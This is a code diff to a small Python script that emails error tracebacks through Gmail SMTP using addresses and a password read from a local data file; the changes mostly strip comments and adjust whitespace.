@@ -14,30 +14,24 @@ with open('data.txt', 'r') as inp:
 os.system('./clear_traceback.txt')
 
 def send_email(MESSAGE):
-    # create message object instance
-    msg = MIMEMultipart()
 
-    # setup the parameters of the message
+    msg = MIMEMultipart()
+    
     message = MESSAGE
     password = data[6]
     msg['From'] = data[5]
     msg['To'] = data[7]
     msg['Subject'] = '! ERROR TRACEBACK !'
 
-    # add in the message body
     for stroke in MESSAGE:
         msg.attach(MIMEText(stroke, 'plain'))
 
-    #create server
     server = smtplib.SMTP('smtp.gmail.com: 587')
 
     server.starttls()
-
-    # Login Credentials for sending the mail
     server.login(msg['From'], password)
 
 
-    # send the message via the server.
     for item in range(1):
         server.sendmail(msg['From'], msg['To'], msg.as_string())
 
